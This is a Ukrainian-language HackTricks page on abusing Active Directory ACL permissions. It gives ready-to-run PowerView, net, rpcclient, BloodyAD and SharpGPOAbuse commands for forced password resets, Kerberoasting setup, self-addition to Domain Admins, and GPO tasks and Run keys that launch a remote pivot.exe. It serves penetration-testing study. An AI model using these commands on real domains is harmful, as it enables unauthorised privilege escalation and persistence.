# Зловживання Active Directory ACLs/ACEs

{{#include ../../../banners/hacktricks-training.md}}

**Ця сторінка здебільшого є підсумком технік з** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **та** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Для детальнішої інформації див. оригінальні статті.**

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **GenericAll Rights on User**

Це право надає зловмиснику повний контроль над цільовим обліковим записом користувача. Після підтвердження прав `GenericAll` за допомогою команди `Get-ObjectAcl`, зловмисник може:

- **Змінити пароль цілі**: Використовуючи `net user <username> <password> /domain`, зловмисник може скинути пароль користувача.
- **Targeted Kerberoasting**: Призначити SPN для облікового запису користувача, щоб зробити його kerberoastable, а потім використати Rubeus та targetedKerberoast.py для витягання та спроби злому хешів ticket-granting ticket (TGT).
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Цілеспрямований ASREPRoasting**: Вимкніть pre-authentication для користувача, зробивши його обліковий запис вразливим до ASREPRoasting.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
## **GenericAll — права над групою**

Ця привілегія дозволяє зловмиснику маніпулювати членством у групі, якщо він має `GenericAll` права на групу, наприклад `Domain Admins`. Після визначення distinguished name групи за допомогою `Get-NetGroup`, зловмисник може:

- **Додати себе до групи `Domain Admins`**: Це можна зробити за допомогою прямих команд або використовуючи модулі, як-от Active Directory чи PowerSploit.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- З Linux ви також можете використовувати BloodyAD, щоб додати себе до довільних груп, якщо ви маєте GenericAll/Write права щодо них. Якщо цільова група вкладена в “Remote Management Users”, ви миттєво отримаєте доступ WinRM на хостах, які враховують цю групу:
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

Наявність цих привілеїв на об'єкті комп'ютера або обліковому записі користувача дозволяє:

- **Kerberos Resource-based Constrained Delegation**: Дозволяє захопити об'єкт комп'ютера.
- **Shadow Credentials**: Використовуйте цю техніку, щоб видавати себе за обліковий запис комп'ютера або користувача, використовуючи привілеї для створення Shadow Credentials.

## **WriteProperty on Group**

Якщо користувач має `WriteProperty` права на всі об'єкти для певної групи (наприклад, `Domain Admins`), він може:

- **Add Themselves to the Domain Admins Group**: Досягається шляхом поєднання команд `net user` і `Add-NetGroupUser`; цей метод дозволяє ескалацію привілеїв у домені.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) on Group**

Ця привілея дозволяє атакувальникам додавати себе до конкретних груп, таких як `Domain Admins`, за допомогою команд, які безпосередньо маніпулюють членством у групі. Використання наступної послідовності команд дозволяє самододавання:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

Аналогічне повноваження, яке дозволяє зловмисникам безпосередньо додавати себе до груп шляхом зміни властивостей груп, якщо вони мають право `WriteProperty` на цих групах. Підтвердження та виконання цього повноваження здійснюються за допомогою:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Наявність `ExtendedRight` для користувача з правом `User-Force-Change-Password` дозволяє скинути пароль без знання поточного пароля. Перевірка цього права та його використання можуть виконуватися через PowerShell або альтернативні інструменти командного рядка, які пропонують кілька методів скидання пароля користувача, включно з інтерактивними сесіями та one-liners для неінтерактивних середовищ. Команди варіюються від простих викликів PowerShell до використання `rpcclient` на Linux, що демонструє гнучкість векторів атаки.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner у групі**

Якщо зловмисник виявить, що має права `WriteOwner` над групою, він може змінити власника групи на себе. Це особливо критично, коли мова про `Domain Admins`, оскільки зміна власника дає ширший контроль над атрибутами групи та її членством. Процес полягає у виявленні відповідного об'єкта за допомогою `Get-ObjectAcl`, а потім використанні `Set-DomainObjectOwner` для зміни власника — або за SID, або за іменем.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite для користувача**

Цей дозвіл дозволяє зловмиснику змінювати властивості користувача. Зокрема, маючи доступ `GenericWrite`, зловмисник може змінити шлях скрипта входу користувача, щоб виконати шкідливий скрипт при вході. Це досягається за допомогою команди `Set-ADObject` для оновлення властивості `scriptpath` цільового користувача, щоб вона вказувала на скрипт зловмисника.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

З цією привілеєю нападники можуть змінювати членство в групах, наприклад додавати до певних груп себе або інших користувачів. Цей процес включає створення credential object, використання його для додавання або видалення користувачів із групи та перевірку змін у членстві за допомогою команд PowerShell.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## **WriteDACL + WriteOwner**

Володіння об'єктом AD та наявність `WriteDACL` привілеїв на ньому дозволяє нападнику надати собі привілеї `GenericAll` над цим об'єктом. Це реалізується через ADSI manipulation, що надає повний контроль над об'єктом та можливість змінювати його членство в групах. Однак існують обмеження при спробі використати ці привілеї за допомогою модуля Active Directory і його cmdlets `Set-Acl` / `Get-Acl`.
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
## **Реплікація в домені (DCSync)**

Атака DCSync використовує специфічні дозволи на реплікацію в домені, щоб імітувати контролер домену та синхронізувати дані, включно з обліковими даними користувачів. Ця потужна техніка потребує таких дозволів, як `DS-Replication-Get-Changes`, що дозволяє зловмисникам витягувати чутливу інформацію з середовища AD без прямого доступу до контролера домену. [**Дізнайтеся більше про атаку DCSync тут.**](../dcsync.md)

## Делегування GPO <a href="#gpo-delegation" id="gpo-delegation"></a>

### Делегування GPO

Делегований доступ для керування Об'єктами групової політики (GPO) може становити значні ризики для безпеки. Наприклад, якщо користувач, такий як `offense\spotless`, має делеговані права керування GPO, йому можуть надаватися привілеї, як-от **WriteProperty**, **WriteDacl** та **WriteOwner**. Цими дозволами можна зловживати зловмисними цілями, як це ідентифікується за допомогою PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### Перелічення дозволів GPO

Щоб виявити неправильно налаштовані GPO, cmdlet'и PowerSploit можна ланцюжити. Це дозволяє знайти GPO, якими певний користувач може керувати: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Комп'ютери, до яких застосовано певну політику**: Можна визначити, до яких комп'ютерів застосовано конкретний GPO, що допомагає зрозуміти масштаб потенційного впливу. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Політики, застосовані до певного комп'ютера**: Щоб побачити, які політики застосовано до конкретного комп'ютера, можна використати команди на зразок `Get-DomainGPO`.

**OU, до яких застосовано політику**: Визначити організаційні підрозділи (OU), на які впливає політика, можна за допомогою `Get-DomainOU`.

Ви також можете використати інструмент [**GPOHound**](https://github.com/cogiceo/GPOHound) для перерахування GPO і пошуку в них проблем.

### Зловживання GPO - New-GPOImmediateTask

Неправильно налаштовані GPO можна експлуатувати для виконання коду, наприклад шляхом створення миттєвого запланованого завдання. Це можна використати, щоб додати користувача до групи локальних адміністраторів на уражених машинах, що значно підвищує привілеї:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

Модуль GroupPolicy, якщо встановлено, дозволяє створювати та пов'язувати нові GPOs, а також задавати параметри, такі як значення реєстру, для виконання backdoors на уражених комп'ютерах. Цей метод вимагає оновлення GPO та входу користувача в систему на комп'ютері для виконання:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuse GPO

SharpGPOAbuse пропонує метод зловживання існуючими GPO шляхом додавання завдань або зміни налаштувань без необхідності створювати нові GPO. Цей інструмент вимагає модифікації існуючих GPO або використання RSAT для створення нових перед застосуванням змін:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Примусове оновлення політики

Оновлення GPO зазвичай відбуваються приблизно кожні 90 хвилин. Щоб пришвидшити цей процес, особливо після внесення зміни, на цільовому комп’ютері можна виконати команду `gpupdate /force` для примусового негайного оновлення політик. Ця команда гарантує, що будь-які зміни в GPO застосуються без очікування наступного автоматичного циклу оновлення.

### Під капотом

Після перевірки запланованих завдань для певного GPO, наприклад `Misconfigured Policy`, можна підтвердити додавання завдань, таких як `evilTask`. Ці завдання створюються за допомогою скриптів або інструментів командного рядка з метою змінити поведінку системи або підвищити привілеї.

Структура завдання, як показано у XML-конфігураційному файлі, згенерованому `New-GPOImmediateTask`, описує деталі запланованого завдання — включно з командою, що має бути виконана, та її тригерами. Цей файл демонструє, як заплановані завдання визначаються та керуються в межах GPO, надаючи спосіб виконання довільних команд або скриптів у рамках застосування політик.

### Користувачі та групи

GPO також дозволяють маніпулювати членством користувачів і груп на цільових системах. Редагуючи файли політик Users and Groups безпосередньо, зловмисники можуть додавати користувачів до привілейованих груп, таких як локальна група `administrators`. Це можливо завдяки делегуванню прав управління GPO, яке дозволяє змінювати файли політик для включення нових користувачів або зміни членства в групах.

XML-конфігураційний файл для Users and Groups описує, як реалізуються ці зміни. Додаючи записи до цього файлу, конкретним користувачам можна надати підвищені привілеї на уражених системах. Цей метод дає прямий шлях до підвищення привілеїв через маніпуляцію GPO.

Крім того, можна розглянути додаткові методи для виконання коду або підтримки персистентності, такі як використання скриптів входу/виходу, модифікація ключів реєстру для автозапуску, встановлення ПЗ через .msi-файли або редагування конфігурацій сервісів. Ці техніки надають різні шляхи для збереження доступу та контролю над цільовими системами шляхом зловживання GPO.

## Посилання

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)

{{#include ../../../banners/hacktricks-training.md}}
